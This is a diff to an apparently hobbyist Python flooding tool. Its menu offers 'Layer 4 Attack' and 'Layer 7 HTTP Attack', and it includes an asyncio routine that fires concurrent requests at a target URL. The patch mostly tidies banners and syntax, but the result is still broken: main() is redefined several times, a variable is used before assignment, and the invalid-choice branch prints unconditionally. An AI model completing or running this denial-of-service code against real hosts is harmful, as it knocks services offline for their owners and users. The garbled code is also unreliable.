@@ -75,7 +75,7 @@ while attemps < 100:
 def main():
     clear()
     if choice == "1":   
-        display_header():
+        display_header()
         header_lines = [
         Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
         Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
@@ -105,26 +105,25 @@ def layer4_attack(target_ip, duration):
         print(Fore.RED + f"[] LAYER 4 {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {CSS} {Fore.WHITE} BYTES TO {target_ip}:{port} {Fore.GREEN}Running :::")
         time.sleep(0.2)
     print(Fore.GREEN + "\n[✔] LAYER 4 \033[1;31m F I N N A L Y  AT T A C K !\n")
-    print(Fore.RED + "\n[!] Invalid choice.")
-   
+    
 # ============================
 #   Layer 7 Stress Test
 # ============================
 def main():
     clear()
-    elif choice == "2":
-          display_header():
-          header_lines = [
-          Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
-          Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
-          Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝",
+    if choice == "2":
+        display_header()
+        header_lines = [
+        Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
+        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
+        Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝",
     ]
     for line in header_lines:
         print(line)
@@ -153,8 +152,7 @@ async def layer7_attack(url, concurrency, duration):
         tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
         results = await asyncio.gather(*tasks)
     print(Fore.WHITE + f"\n[✔] Total requests sent: {sum(results)}")
-    print(Fore.RED + "\n[!] Invalid choice.")
- 
+    
 # ============================
 #   Menu Utama
 # ============================
@@ -165,9 +163,7 @@ def main():
     print(Fore.YELLOW + "1. Layer 4 Attack")
     print(Fore.CYAN + "2. Layer 7 HTTP Attack")
     choice = input(Fore.WHITE + "\nSelect option: ")
-
-    else:
-        print(Fore.RED + "\n[!] Invalid choice.")
+    print(Fore.RED + "\n[!] Invalid choice.")
 
 if __name__ == "__main__":
     main()
